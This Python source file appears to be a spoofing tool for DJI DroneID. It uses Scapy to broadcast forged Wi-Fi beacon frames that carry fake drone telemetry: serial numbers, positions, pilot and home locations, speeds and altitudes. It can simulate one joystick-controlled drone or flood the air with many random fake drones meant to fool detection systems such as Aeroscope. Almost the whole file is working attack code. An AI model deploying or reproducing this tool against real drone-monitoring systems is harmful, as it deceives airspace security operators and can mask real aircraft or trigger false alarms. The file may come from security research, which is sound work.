from Beacon import *
import struct
import sys, getopt, argparse
from scapy.sendrecv import sendp, send
import random, string
from math import floor
import jstest
import time, os
import threading



class DroneID:
    common_header = b'Xb\x13'
    telemetry_byte = b'\x10'
    flight_info_byte = b'\x11'
    random_source = string.ascii_uppercase + string.digits  # character set to generate random strings


    def __init__(self,*args, **kwargs):
        print('args: ', args, ' kwargs: ', kwargs)

        # More than one argument means spoofing randomly
        point = None
        index = 0
        if len(args) == 2 :
            index= args[0] 
            point= args[1]

            # Args 0 = Index of the spoofed drone 
            # Args 1 = Spoofing point [long, lat]
            #self.init_random_drone(int(args[0]), args[1])
                   
        self.ssid = kwargs['ssid'] if len(kwargs["ssid"]) > 0 else ''.join(["FAKE-", str(index + 1)])

        self.state = b'\x02M\x063\x1f' # Dunno what's exactly that
        self.sernum = ''.join(random.choice(DroneID.random_source) for i in range(16))
        
        # INPUT * 174533.0 little endian
        # ====== Locations ===========

        self.longitude = float(kwargs['lon']) if len(kwargs["lon"]) > 0  else random_location(point)[0]
        self.longitude_bytes = location2bytes(self.longitude)
        self.latitude = float(kwargs['lat']) if len(kwargs["lat"]) > 0  else random_location(point)[1]
        self.latitude_bytes = location2bytes(self.latitude)

        longitude_home = float(kwargs['home_lon']) if len(kwargs["home_lon"]) > 0  else random_location()[0]
        self.longitude_home = location2bytes(longitude_home)
        latitude_home = float(kwargs['home_lat']) if len(kwargs["home_lat"]) > 0  else random_location()[1] 
        self.latitude_home = location2bytes(latitude_home)

        # home and pilot location will be the same
        self.pilot_lon = location2bytes(longitude_home)
        self.pilot_lat = location2bytes(latitude_home)

        self.altitude = int(kwargs['altitude']) if len(kwargs['altitude']) > 0  else randomN(0,2**16-1) # Max 16 bits little endian unsgined
        self.height = randomN(0,2**16-1)  # Max 16 bits little endian unsgined

        # ====== Drone axes motion and axis speed========

        #speed_aeroscope = (speed / 100)
        self.v_north =  100 * randomN(-50, 50) # randomN((-2**15),2**15-1) 
        self.v_east = 100 * randomN(-50, 50) #randomN((-2**15),2**15-1)
        self.v_up =  100 * randomN(-50, 50) #randomN((-2**15),2**15-1)
        self.pitch = randomN((-2**15),2**15-1)       
        self.roll = randomN((-2**15),2**15-1)          
        self.yaw = randomN((-2**15),2**15-1)            

        # ===== Drone's info =========
        self.prod_type = os.urandom(1) # b'x\10'
        self.uuid = kwargs['uuid'] if len(kwargs['uuid']) > 0 else ''.join(random.choice(string.digits) for i in range(7))
        self.uuid_len = len(self.uuid)

        [print(attribute, getattr(self, attribute)) for attribute in dir(self) if not attribute.startswith("__") and not callable(self)]

    '''
    Make all values of the drone random
    If point is None, no area limit. Limit spoofed area otherwise
    '''
    def init_random_drone(self, index=0, point=None):

        if point is not None:
            print("Spoofing around {}".format(point))

        self.ssid = ''.join(["FAKE-", str(index + 1 )])
        self.mac_address = "60:60:1f:%02x:%02x:%02x" % (randomN(0, 255), randomN(0, 255), randomN(0, 255))  # it also accepts non DJI OUI mac address    

        # What's that?
        self.state = b'\x02M\x063\x1f' # Check the last byte what is exactly... SN length?
        self.sernum = ''.join(random.choice(DroneID.random_source) for i in range(16))  # Must be 16 characters


        self.longitude, self.latitude = random_location(point)
        print("Drone at {} and {}".format(self.longitude, self.latitude))
        self.longitude_bytes = location2bytes(self.longitude)
        self.latitude_bytes = location2bytes(self.latitude)
        
        longitude_home, latitude_home = random_location(point) 
        self.longitude_home = location2bytes(longitude_home)
        self.latitude_home = location2bytes(latitude_home)

        pilot_lon, pilot_lat = random_location(point) 
        self.pilot_lon = location2bytes(pilot_lon)
        self.pilot_lat = location2bytes(pilot_lat)

        self.altitude = randomN(0,2**15-1)     # Max 32 bits little endian
        self.height = randomN(0,2**15-1)
        self.v_north = randomN((-2**15),2**15-1)  # 2 Bytes   little endian signed
        self.v_east = randomN((-2**15),2**15-1)  # 2 Bytes   little endian signed
        self.v_up = randomN((-2**15),2**15-1)  # 2 Bytes   little endian signed
        self.pitch = randomN((-2**15),2**15-1)  # 2 Bytes   little endian   signed
        self.roll = randomN((-2**15),2**15-1)  # 2 Bytes   little endian signed
        self.yaw = randomN((-2**15),2**15-1)  # 2 Bytes   little endian signed
        
        self.prod_type = b'\x10' # Make it random
        self.uuid = ''.join(random.choice(string.digits) for i in range(7))
        self.uuid_len = len(self.uuid)
    

    '''
    Returns the payload containing the DroneID  telemetry info in bytes
    '''
    def build_telemetry(self):

        drone2bytes = b''.join([DroneID.common_header,
        DroneID.telemetry_byte,
        self.state,
        self.attribute2byte(self.sernum),
        self.longitude_bytes,
        self.latitude_bytes,
        self.attribute2byte(self.altitude, signed=True),
        self.attribute2byte(self.height, signed=True),
        self.attribute2byte(self.v_north),
        self.attribute2byte(self.v_east),
        self.attribute2byte(self.v_up),
        self.attribute2byte(self.yaw), # that changed from report.. it said pich here
        self.attribute2byte(self.roll),
        self.attribute2byte(self.pitch),
        b'\x00\x00\x00\x00', # Don't know what is going on with that field. It somehow modifies home location
        self.pilot_lat,
        self.pilot_lon,
        self.longitude_home,
        self.latitude_home,
        self.prod_type,
        self.attribute2byte(self.uuid_len),
        self.attribute2byte(self.uuid)       
        ])
        
        # some padding to have the same length as de original DJI payload
        drone2bytes = b''.join([drone2bytes,b'\x00'*(91 - len(drone2bytes))]) 

        return drone2bytes

    '''
    Returns the payload containing the DroneID flight info
    '''
    def build_finfo(self, identification="identification", flight_info="info"):

        finfo_bytes = b''.join([DroneID.common_header,
        DroneID.flight_info_byte,  # 11
        self.attribute2byte(self.sernum),
        self.attribute2byte(str(len(identification))),  # ToDo-> max 0x7f, minimum of 10 bytes
        self.attribute2byte(identification),
        self.attribute2byte(str(len(flight_info))),
        self.attribute2byte(flight_info)])
        finfo_bytes = b''.join([finfo_bytes,b'\x00'*(147 - len(finfo_bytes))])  # some padding ...
        
        return finfo_bytes

    '''
    Convert one droneID attribute into byte representation if it's not already so
    '''
    def attribute2byte(self, attribute, endiannes='<', signed = False):
        att_type = type(attribute)
        if att_type == str:
            p= str.encode(attribute)
            return p

        elif att_type == int and signed: # For height and altitude
            p = struct.pack(''.join([endiannes, 'H']), attribute)
            return p

        elif att_type == int:
            p= struct.pack(''.join([endiannes,'h']), attribute)
            return p
        elif att_type == float:

            p = struct.pack(''.join([endiannes,'f']), attribute)
            return p
        else:
            #print("Attribute {}: {}".format(attribute,att_type))
            return attribute


'''
Returns a random location. Longitude or Latitude
If a POINT is given, the random location is around the point
'''
def random_location(point= None):

    
    if point is None:
        return random.uniform(-180,180), random.uniform(-90, 90)
    else:
        # https://en.wikipedia.org/wiki/Decimal_degrees
       
        area_range = 100 
        lat_new = float(point[0]) + randomN(0, 9) / area_range
        lon_new = float(point[1]) + randomN(0, 9) / area_range
        return lon_new, lat_new

'''
Conversion for the location coordinates. From Department's 13 report
'''
def location2bytes(location):
    a = struct.pack('<i', floor(float(location) * 174533.0))
    return a

'''
Random number between 'a' and 'b'
If number is negative return the binary complement
To handle the signed integers
'''
def randomN(a,b):
    r = random.randint(a,b)
    if r < 0:
        r = ~r
    return r

'''
   Assemble the DJI payload to a 802.11 beacon packet
'''
def create_packet(beacon_base, payload):
    packet = beacon_base.copy()  

    # Not necessary but it appears in different DJI models
    vendor_microsoft = Dot11EltVendorSpecific(ID=221, len= 24, oui= 0x0050f2,info = b'\x02\x01\x01\x00\x00\x03\xa4\x00\x00\x27\xa4\x00\x00\x42\x43\x5e\x00\x62\x32\x2f\x00')

    # DJI Payload
    tag_vendor_dji = Dot11EltVendorSpecific(ID=221, len = len(payload) + 3,oui=0x263712, info = payload)
    packet = packet / vendor_microsoft / tag_vendor_dji 

    return packet

'''
To Delete
Only for updating location values .... not really practic if we want to update other values like yaw, altitude ...
'''
def update_payload(prev_payload, longi=None, lati=None):
    long_start_position = 25
    lat_start_position = 29
    
    if longi is not None:
        new_payload = prev_payload[:long_start_position] +  longi + prev_payload[long_start_position+4:]


    if lati  is not None:
        new_payload = prev_payload[:lat_start_position] +  lati + prev_payload[lat_start_position+4:]
    
    return new_payload

'''
Update the DJI Vendor ID info from the Scapy Beacon object
'''
def update_packet(prev_packet, new_payload):
    
    # New DJI Payload
    new_tag_vendor_dji = Dot11EltVendorSpecific(ID=221, len = len(new_payload) + 3,oui=0x263712, info = new_payload)

    #is the last Vendor Specific tag... in case we added the Microsoft Vendor Tag
    prev_packet[Dot11EltVendorSpecific][len([prev_packet[Dot11EltVendorSpecific]])-1].payload = new_tag_vendor_dji
    return prev_packet



is_event = 0
'''
The sendp() from Scapy uses a loop that stops only when Ctr+C is pressed.
We want to stop sending a previous payload and start sending a new one
This is a simple way to stop sending a packet.
At the same time, it can be send a packet while the controller is waiting for events (cuz it's also blocking)
'''
def thread_send(packet):
    print("Inside Threat")
    count = 0
    global is_event
    while is_event == 0:
        count += 1
        try:
            sendp(packet[1], iface=interface, loop=0, count=1)
            time.sleep(0.2)
        except KeyboardInterrupt:
            break
 
    print("Old packet:  {} \n New Event.".format(count))

'''
Single Drone Spoofing
If it does not get any input, the values are set randomly

If it detects a joystic, it will process the events and will update drone's values.
'''
def one_drone():
    print("Press intro to set default")
    ssid = str(input("SSID: "))
    lat = (input("Latitude: "))
    lon = (input("Longitude: "))
    altitude = (input("Altitude (Max 65535): "))
    home_lat = (input("Home Latitude: "))
    home_long = (input("Home Longitude: "))
    uuid = str(input("UUID (16 chars): "))
  

    # Create base beacon packet for carrying info of a drone
    source_address = "60:60:1f:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    if len(ssid) == 0:
        ssid = "MAVIC_AIR_REAL"
    beacon_base_packet = Beacon(source_address, ssid).get_beacon()

    # Set drone's initial attributes
    drone = DroneID(ssid=ssid, lat=lat, lon=lon, altitude=altitude, home_lat=home_lat, home_lon=home_long, uuid=uuid)

    # ==== BUILD PACKET LIST =====
    # Flight Info beacons It won't change
    finfo_payload = drone.build_finfo() # ToDo Get user input toset flight info
    finfo_packet = create_packet(beacon_base_packet,finfo_payload)
    # Create the DJI payload in bytes and build the packet with scapy
    telemetry_payload = drone.build_telemetry()
    telemetry_packet = create_packet(beacon_base_packet, telemetry_payload)
    packet_list = []
    
    packet_list.append(finfo_packet)
    packet_list.append(telemetry_packet)

    joystick = jstest.JSTest()
    print("Joystick  {}".format(joystick.gamepad))

    boosted = False
    if joystick.gamepad:
        #ts= time.time()
        while 1:
            global is_event
            try:
                # Start sending packets in a different thread since Joystick is blocking when waiting for events
                send_thread = threading.Thread(target=thread_send, args=(packet_list,))
                send_thread.start()
                print("waiting event")
                events = joystick.gamepad._do_iter() # It blocks untl event is detected
                if events is None or len(events) == 0:
                    print("About to break. No events... but does not work")
                    break

                for event in events:
                   
                    is_event = 1
                    send_thread.join()
                   
                    joystick.process_event(event)
                    
                    axis, value = joystick.axis, joystick.axis_value   # -1X , 1X, -1Y, 1Y, -1RX, -1RY
                    print("We got movement {} {}".format(axis, value))
                    if axis == "X": # Modify Longitude
                        print("Update longitude")
                        drone.longitude = drone.longitude +  float("{:.4f}".format(float(value/ 1000))) # To modify the 4 decimal digit
                        # Substitute payload bytes corresponding to the longitude
                        drone.longitude_bytes = location2bytes(drone.longitude)

                        drone.v_east =  (drone.v_east + 100 * value)  * value # All the time will increase the speed. 
                        drone.v_north =  (drone.v_north - 50) if drone.v_north > 0 else drone.v_north + 50 # To reduce the speed on the other axis

                    elif axis == "Y": # Modify Latitude
                        print("Update latitude")
                        
                        drone.latitude = drone.latitude + float("{:.4f}".format(float(value / 1000))) * (-1)

                        # Substitute payload bytes corresponding to the latitude 
                        drone.latitude_bytes = location2bytes(drone.latitude)

                        drone.v_north =  (drone.v_north +  (-value) * 50)  * value
                        drone.v_east =  (drone.v_east - 50) if drone.v_east > 0 else drone.v_east + 50

                    elif axis == "RY":
                        # modify  and height
                        print("Update latitude")
                        if drone.altitude >= 0 and drone.altitude < 2**16-1:                       
                            drone.altitude = drone.altitude + value * (-1)
                            if drone.altitude <0:
                                drone.altitude = 0
                                pass
                        pass
                    elif axis == "RX":
                        # modify yaw
                        pass
                    elif axis == "TL": # move between 3 or 4 different speeds

                       
                        drone.v_east =  (drone.v_east + 200) % 2500# speed is divided by 100 in the aeroscope.If we want to increase 1 in the aeroscope, we add 100 here
                        drone.v_north = (drone.v_east + 200) % 2500

                    
                    elif axis == "Z": # 
                            drone.v_east = drone.v_east + 100 # speed is divided by 100 in the aeroscope.If we want to increase 1 in the aeroscope, we add 100 here
                            drone.v_north = drone.v_north + 100

                    elif axis == "RZ":
                        drone.v_east = drone.v_east - 100
                        drone.v_north = drone.v_north - 100

                    else:
                        continue

                #Create new payload and update packet
                new_payload = drone.build_telemetry()
                #print(packet_list[1][Dot11EltVendorSpecific].show(dump=True))

                packet_list[1] = update_packet(packet_list[1], new_payload)
                print("UPDATED")
                #print(packet_list[1][Dot11EltVendorSpecific].show(dump=True))
                #packet_list[1] = update_packet(packet_list[1], new_payload)
                is_event = 0 # new loop iteration we start thread sending new payload

            except KeyboardInterrupt:
                is_event = 1
                break

            print("Latitude: {} --- Longitude: {}".format(drone.latitude, drone.longitude))
            print("Altitude: {} ".format(drone.altitude))

    
    else:             
        sendp(packet_list, iface=interface, loop=1, inter=0.5)

def random_spoof(n, point=None):
    
    n_drones = n
    # ToDo Check if I need to copy the packet, or otherwise it reuses the same

    source_address = ""
    ssid = ""
    beacon = Beacon(source_address, ssid ) #
    beacon_base_packet = beacon.get_beacon()

    packet_list = [] # set of packets to be sent
    # First all packets are generated and they will be sent afterwards
    for i in range( int(n_drones)):
        beacon_base_copy = beacon_base_packet.copy()
        print("===========================")
        print("Setting Drone {}".format(i))
        print("===========================")
        
        drone = DroneID(i, point)
        beacon_base_copy.ssid =  drone.ssid
        beacon_base_copy.addr2 = drone.mac_address
        print("SSID: {}".format(drone.ssid))
        print("MAC Address {}".format(drone.mac_address))   
        # Build DJI Payload
        payload = drone.build_telemetry()
        telemetry_packet = create_packet(beacon_base_copy, payload)
        packet_list.append(telemetry_packet)
    
    print("=========All drones are ready ==================")

    sendp(packet_list, iface=interface, loop=1, inter=1)

'''
Main part
Arguments indicate whether to spoof a single specific drone or N random drones
'''

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", help="Spoof on drone. poofing parameters are set by the user.")
parser.add_argument("-r", "--random", help="Spoof randomly N drones")

parser.add_argument("-a", "--area", help="Define point where drones will be spoofed eg: -a '46.76 7.62 '")

args = parser.parse_args()
print("Arguments: {}".format(args))

if not args.interface:
    raise SystemExit(

"Usage: {sys.argv[0]} -i  <interface> [-r] <number of drones> [-a] <'latitude longitude'>\n \
-r N    Spoof N random drones. 2 by default\n \
-a location    If set, drones are spoofed around a random point in a radio of 11km.")

else:

    interface = args.interface
    
    if args.random : # Consider fail when you pass 0 drones... ToDo
        n_random = args.random
        
        print("Spoofing {} drones randomly".format(n_random))
        if args.area:
            point = args.area.split()
            print(point)
            random_spoof(n_random, point)
        random_spoof(n_random)

    else: #Spoof only one drone
        one_drone()